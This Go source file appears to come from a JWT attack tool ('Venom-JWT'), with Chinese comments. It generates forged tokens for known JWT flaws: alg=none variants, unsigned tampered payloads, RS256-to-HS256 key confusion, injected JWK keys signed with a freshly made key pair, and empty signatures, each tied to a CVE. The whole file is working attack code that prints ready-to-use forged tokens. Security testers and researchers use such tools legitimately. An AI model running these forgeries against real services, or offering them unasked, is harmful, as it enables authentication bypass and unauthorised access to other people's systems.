package service

import (
	"Venom-JWT/content"
	"Venom-JWT/model"
	"Venom-JWT/utils"
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"io/ioutil"
	"math/big"
	"os"
	"strings"

	"github.com/gookit/color"
)

// 存储生成的所有JWT令牌
var jwtArr = make([]string, 0)

// setAlgNone 设置JWT算法为none
func setAlgNone(jwtObj *model.Jwt, noneStr string) {
	jwtObj.SetAlgorithm(noneStr)
}

// jwtAlgNoneType 创建算法为None的JWT
func jwtAlgNoneType(jwtObj model.Jwt, noneType string) {
	// 设置算法为none类型
	setAlgNone(&jwtObj, noneType)

	// 序列化头部
	headerStr, err := jwtObj.HeaderToString()
	if err != nil {
		color.Printf("\n<red>[-]JSON序列化错误: %s</>\n", err.Error())
		return
	}

	// 构建JWT字符串（无签名）
	var jwtStr = utils.EncodeJWT(headerStr) + "." + utils.EncodeJWT(jwtObj.Payload) + "."
	jwtArr = append(jwtArr, jwtStr)

	color.Printf("\n<magentaB>[+]</>【alg为%s】: <primary>%s</>\n", noneType, jwtStr)
}

// JwtAlgNoneService 测试alg=none漏洞 (CVE-2015-9235)
func JwtAlgNoneService(jwt model.Jwt) {
	color.Println("\n<blue>①</> 大部分情况在alg为HS256时候，可以将JWT改为none的情况(CVE-2015-9235)")

	// 尝试多种none的大小写变体
	var noneTypes = []string{"none", "None", "NoNe", "NONE"}
	for _, typeStr := range noneTypes {
		jwtAlgNoneType(jwt, typeStr)
	}
}

// JwtWithNoCheck 测试未验证签名导致的越权漏洞
func JwtWithNoCheck(firstBodyStr string, secondBodyStr string, thirdBodyStr string) {
	color.Println("\n<blue>②</> 未验证签名攻击(无效签名攻击)：修改Payload不校验(需要修改payload)")

	var jwtStr = firstBodyStr + "." + utils.EncodeJWT(secondBodyStr) + "." + thirdBodyStr
	jwtArr = append(jwtArr, jwtStr)

	color.Println("\n<magentaB>[+]</>【未验证签名攻击(无效签名攻击)】: <primary>" + jwtStr + "</>")
}

// JwtModifyAsymToSym 测试将RS256改为HS256漏洞 (CVE-2016-10555)
func JwtModifyAsymToSym(jwtObj model.Jwt, pemPath string) {
	// 检查算法是否为RS256
	if strings.ToUpper(jwtObj.GetAlgorithm()) != "RS256" {
		color.Println("\n<yellow>提示：</>该JWT非RS256不进行alg为HS256(CVE-2016-10555)的修改")
		return
	}

	color.Println("\n<blue>③</> 修改非对称密码算法为对称密码算法(CVE-2016-10555)攻击")

	// 获取密钥
	key := ""
	if pemPath != "" {
		keyBytes, err := ioutil.ReadFile(pemPath)
		if err != nil {
			color.Printf("\n<red>[-]读取PEM文件失败: %s</>\n", err.Error())
			os.Exit(1)
		}
		key = string(keyBytes)
	} else {
		key = content.JWT_MODIFY_AS_TO_SYM
	}

	// 创建HS256头部
	header := utils.CreateHS256Header(jwtObj.RealHeader)
	payload := utils.EncodeJWT(jwtObj.Payload)

	// 构建JWT前两部分
	token := header + "." + payload

	// 使用HS256算法生成签名
	h := hmac.New(sha256.New, []byte(key))
	h.Write([]byte(token))
	sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
	sig = strings.TrimRight(sig, "=")

	// 构建完整的JWT
	jwtStr := token + "." + sig
	jwtArr = append(jwtArr, jwtStr)

	color.Println("\n<magentaB>[+]</> 【修改非对称密码算法为对称密码算法】:<primary>" + jwtStr + "</>")
}

// JwtWithFakeKey 测试JWKS公钥注入伪造密钥 (CVE-2018-0114)
func JwtWithFakeKey(jwtBody string) {
	color.Println("\n<blue>④</> JWKS公钥注入--伪造密钥(CVE-2018-0114)攻击")

	// 对负载进行Base64编码
	payloadB64 := base64.RawURLEncoding.EncodeToString([]byte(jwtBody))

	// 生成RSA密钥对
	privKey, pubKey, err := utils.GenRsaPrivKey()
	if err != nil {
		color.Printf("\n<red>[-]生成RSA密钥失败: %s</>\n", err.Error())
		return
	}

	// 保存公钥到文件
	if err := utils.WritePubKeyToFile(pubKey); err != nil {
		color.Printf("\n<red>[-]保存公钥失败: %s</>\n", err.Error())
	}

	// 保存私钥到文件
	if err := utils.WritePrivKeyToFile(privKey); err != nil {
		color.Printf("<red>[-]保存私钥失败: %s</>\n", err.Error())
	}

	// 对公钥参数进行Base64编码
	nB64 := base64.RawURLEncoding.EncodeToString(pubKey.N.Bytes())
	exp := big.NewInt(int64(pubKey.E))
	eB64 := base64.RawURLEncoding.EncodeToString(exp.Bytes())

	// 获取带有JWK的头部
	headersB64 := utils.GetHeadersB64(nB64, eB64)
	data := headersB64 + "." + payloadB64

	// 计算签名
	hash := sha256.Sum256([]byte(data))
	sign, err := rsa.SignPKCS1v15(rand.Reader, privKey, crypto.SHA256, hash[:])
	if err != nil {
		color.Printf("<red>[-]生成签名失败: %s</>\n", err.Error())
		return
	}

	// 构建完整的JWT
	signB64 := base64.RawURLEncoding.EncodeToString(sign)
	jwtStr := data + "." + signB64
	jwtArr = append(jwtArr, jwtStr)

	color.Println("\n<magentaB>[+]</>【伪造密钥】: <primary>" + jwtStr + "</>")
}

// JwtNullSecret 测试空签名漏洞 (CVE-2020-28042)
func JwtNullSecret(firstBodyStr string, payload string) {
	color.Println("\n<blue>⑤</> 空签名(CVE-2020-28042)攻击")

	// 构建JWT（空签名）
	jwtStr := firstBodyStr + "." + utils.EncodeJWT(payload) + "."
	jwtArr = append(jwtArr, jwtStr)

	color.Println("\n<magentaB>[+]</>【空签名】: <primary>" + jwtStr + "</>")
}
